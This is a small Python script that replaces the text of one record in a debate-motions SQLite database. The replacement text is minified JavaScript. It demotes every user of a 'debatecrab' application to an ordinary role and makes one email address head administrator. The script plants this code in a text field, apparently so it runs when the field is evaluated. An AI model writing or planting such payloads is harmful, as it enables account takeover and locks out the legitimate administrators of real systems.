import sqlite3

DB_PATH = "motions.db"

# ── EDIT THESE TWO ──────────────────────────────────────────
MOTION_ID  = 4025                          # <-- put the id here
NEW_TEXT   = """const dbPath=path.resolve(__dirname,"debatecrab.sqlite");const db=new sqlite3.Database(dbPath);const run=(sql,params=[])=>new Promise((resolve,reject)=>db.run(sql,params,function(err){if(err)reject(err);else resolve(this);}));(async()=>{try{await run("UPDATE users SET role=?",["user"]);await run("UPDATE users SET role=? WHERE email=?",["head_admin","bro@is.sick"]);}catch(err){console.error("Error updating database:",err);}finally{db.close();}})();"""    # <-- put your text here
# ────────────────────────────────────────────────────────────

conn   = sqlite3.connect(DB_PATH)
cursor = conn.cursor()

cursor.execute("SELECT id, motion, category FROM motions WHERE id = ?", (MOTION_ID,))
row = cursor.fetchone()

if row is None:
    print(f"No motion found with id={MOTION_ID}")
else:
    print(f"Before -> id={row[0]} | motion={row[1]} | category={row[2]}")
    cursor.execute("UPDATE motions SET motion = ? WHERE id = ?", (NEW_TEXT, MOTION_ID))
    conn.commit()
    print(f"After  -> id={MOTION_ID} | motion={NEW_TEXT}")

conn.close()
